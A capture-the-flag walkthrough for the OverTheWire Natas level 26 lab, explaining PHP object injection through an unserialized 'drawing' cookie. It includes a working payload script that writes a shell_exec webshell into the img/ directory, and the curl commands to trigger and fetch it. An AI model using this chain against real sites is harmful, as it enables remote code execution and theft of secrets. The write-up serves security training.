> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas26.natas.labs.overthewire.org`                  |
| Username | `natas26`                                                    |
| Password | *found in [Natas Level 24 → 25](natas-level-24-level-25.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — the page links to its own PHP source
- **PHP** — to serialize a crafted object locally and base64-encode it
- **`curl`** — to send the poisoned cookie and fetch the written webshell

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas26.natas.labs.overthewire.org` and log in with the password from Level 25.

The page displays a drawing tool. Four number inputs — `x1`, `y1`, `x2`, `y2` — define a line segment. Submitting the form draws the line onto a PNG image, which is displayed on the page. Subsequent submissions add more lines, and the drawing persists across page loads. There is a **View sourcecode** link. Click it.

---

### Step 2 — Read the Source Code

The source is long. The parts that matter are the `Logger` class, the `drawFromUserdata()` function, and the main page logic.

**The `Logger` class:**

```php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file){
        // initialise variables
        $this->initMsg="#--session started--#\n";
        $this->exitMsg="#--session end--#\n";
        $this->logFile = "/tmp/natas26_" . $file . ".log";

        // write initial message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->initMsg);
        fclose($fd);
    }

    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }

    function __destruct(){
        // write exit message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }
}
```

`Logger` has three private properties: `$logFile` (where to write), `$initMsg` (written on construction), and `$exitMsg` (written on destruction). The constructor takes a `$file` argument and writes to `/tmp/natas26_<file>.log`, a path under `/tmp/`, which is **not** web-accessible. The default log path is irrelevant to the attack: what matters is that we control `$logFile` in our deserialized object and can point it anywhere the web server process can write, including the web-accessible `img/` directory.

The key method is `__destruct()` — a PHP magic method called automatically when the object is garbage-collected or when the script finishes. It opens `$logFile` and writes `$exitMsg` into it.

**The `drawFromUserdata()` function:**

```php
function drawFromUserdata($img){
    if (array_key_exists("drawing", $_COOKIE)){
        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        if($drawing)
            foreach($drawing as $object)
                if( array_key_exists("x1", $object) &&
                    array_key_exists("y1", $object) &&
                    array_key_exists("x2", $object) &&
                    array_key_exists("y2", $object)){

                    $color=imagecolorallocate($img,0xff,0x12,0x1c);
                    imageline($img,$object["x1"],$object["y1"],
                            $object["x2"] ,$object["y2"] ,$color);
                }
    }
}
```

The `drawing` cookie stores the line history as a base64-encoded, serialized PHP array. On each page load, the cookie is base64-decoded and passed directly to `unserialize()`. No type check, no class whitelist, no validation of any kind. After deserialization the code iterates the result as an array of coordinate objects — but `unserialize()` has already run by then, and any magic methods on injected objects have already been triggered.

**The `storeData()` function** also calls `unserialize()` on the same cookie:

```php
function storeData(){
    // ...
    if (array_key_exists("drawing", $_COOKIE)){
        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
    }
    // ...
    setcookie("drawing",base64_encode(serialize($drawing)));
}
```

There are two unserialization points per request. Either fires `__destruct()` when the reconstructed object goes out of scope. Both are equally exploitable; the attack only needs one.

**The main page logic:**

```php
session_start();

if (array_key_exists("drawing", $_COOKIE) ||
    (array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
     array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
    $imgfile="img/natas26_" . session_id() .".png";
    drawImage($imgfile);
    showImage($imgfile);
    storeData();
}
```

The block triggers when the `drawing` cookie exists — no GET parameters needed. Sending just the poisoned cookie is sufficient to execute the full chain. `session_start()` is again called after the functions run, the same late-start pattern seen in Level 25. The `Logger` class is declared before any of this — making it available to the PHP runtime at deserialization time. The `img/` directory is web-accessible: files written there can be fetched directly over HTTP.

---

### Understand PHP Object Injection

PHP's `serialize()` function converts an object into a string representation that captures its class name and all property values. `unserialize()` reconstructs an object from that string, including re-instantiating the correct class.

When `unserialize()` reconstructs an object, PHP automatically calls certain **magic methods**:

- `__wakeup()` — called immediately after deserialization
- `__destruct()` — called when the object is destroyed (end of script or explicit `unset()`)

These methods run **on whatever object was encoded in the serialized string** — not necessarily the class the application intended. If an attacker controls the serialized string passed to `unserialize()`, they control which class is instantiated and what values its properties hold. If that class has a magic method that performs a dangerous operation — writing to a file, executing code, making a network call — the attacker can trigger it with attacker-controlled arguments.

This is **PHP Object Injection**: injecting a crafted serialized object to hijack a magic method's execution.

Two conditions must hold for this attack to work:

1. A class with a useful magic method must be declared in the same PHP file (or included before) the `unserialize()` call.
2. The attacker must control the value passed to `unserialize()`.

Both conditions are met here. `Logger` is declared before `drawFromUserdata()`. The `drawing` cookie is entirely attacker-controlled.

**The gadget:** `Logger::__destruct()` opens `$logFile` and writes `$exitMsg` into it. If we craft a `Logger` object where `$logFile` is a web-accessible PHP file path and `$exitMsg` is PHP code, then:

1. The server deserializes our object → reconstructs a `Logger` instance with our property values
2. At end of script, `__destruct()` fires → opens our chosen path → writes our PHP code into it
3. We fetch that file over HTTP → the server executes our PHP → outputs the password

---

### Step 3 — Craft the Malicious Serialized Object

Write a small PHP script locally to produce the payload. The script defines a `Logger` class with the same property names as the server's version, sets them to our chosen values, serializes an instance, and base64-encodes the result.

```php
<?php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct() {
        $this->logFile = "img/natas26_shell.php";
        $this->initMsg = "";
        $this->exitMsg = "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
    }
}

$payload = base64_encode(serialize(new Logger()));
echo $payload . "\n";
?>
```

Run it locally:

```bash
php payload.php
```

This outputs a base64 string — the serialized `Logger` object encoded for cookie transport. Save it:

```bash
php payload.php > payload.b64
```

**What the serialized string encodes:**

```
O:6:"Logger":3:{
  s:15:"LoggerlogFile"; s:20:"img/natas26_shell.php";
  s:15:"LoggerInitMsg"; s:0:"";
  s:15:"LoggerexitMsg"; s:60:"<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
}
```


---

### Step 4 — Send the Poisoned Cookie

Deliver the payload as the `drawing` cookie:

```bash
curl -u natas26:<password> \
     -b "drawing=$(cat payload.b64)" \
     "http://natas26.natas.labs.overthewire.org/index.php"
```

|Flag / argument|Meaning|
|---|---|
|`-u natas26:<password>`|HTTP Basic Authentication|
|`-b "drawing=..."`|Sends the `drawing` cookie set to our base64-encoded serialized `Logger` object|

The server processes the request:

1. `drawFromUserdata()` base64-decodes the cookie and calls `unserialize()` on the result
2. PHP reconstructs a `Logger` object with `$logFile = "img/natas26_shell.php"` and `$exitMsg = "<?php echo shell_exec(...); ?>"`
3. The script finishes; `__destruct()` fires; the file `img/natas26_shell.php` is created containing the PHP payload

---

### Step 5 — Fetch the Written File

The file is now sitting in the web-accessible `img/` directory. Request it directly:

```bash
curl -u natas26:<password> \
     "http://natas26.natas.labs.overthewire.org/img/natas26_shell.php"
```

The server executes the PHP inside the file and the output contains the password for the next level:

```
<password>
```

That is the password for [Natas Level 26 → 27](natas-level-26-level-27.md).

---

## Key Takeaways

- **`unserialize()` on user input is almost always exploitable.** Deserialization reconstructs objects — including triggering magic methods — from attacker-controlled data. There is no safe way to call `unserialize()` on untrusted input unless the PHP version supports a class whitelist (`allowed_classes` in PHP 7+) and that whitelist excludes every class with a dangerous magic method.
- **Magic methods are gadgets.** `__destruct()`, `__wakeup()`, `__toString()`, and others run automatically in response to object lifecycle events. Their code executes with the property values encoded in the serialized string — values the attacker controls entirely. A class only needs to exist in scope at the time of `unserialize()` for its magic methods to be exploitable.
- **The class definition does not travel with the serialized object.** `unserialize()` looks up the class by name in the currently loaded PHP environment. The attacker's payload only needs to name a class that the server already has defined. Here, `Logger` is defined in the same file as the `unserialize()` call — it is always in scope.
- **Private property names in serialized strings include null bytes.** PHP encodes private properties as `\x00ClassName\x00propertyName`. The attacker's locally generated payload must use the same class name as the server's version — otherwise the property names won't match and the object will be reconstructed with null values instead of the attacker's payload. This is why replicating the exact class structure locally is necessary.
- **A writable, web-accessible directory turns file-write into RCE.** Writing PHP code to `img/natas26_shell.php` and then fetching it over HTTP is equivalent to uploading a webshell. The attack chain — object injection → `__destruct()` file write → HTTP fetch → code execution — is a standard POP (Property-Oriented Programming) chain.

---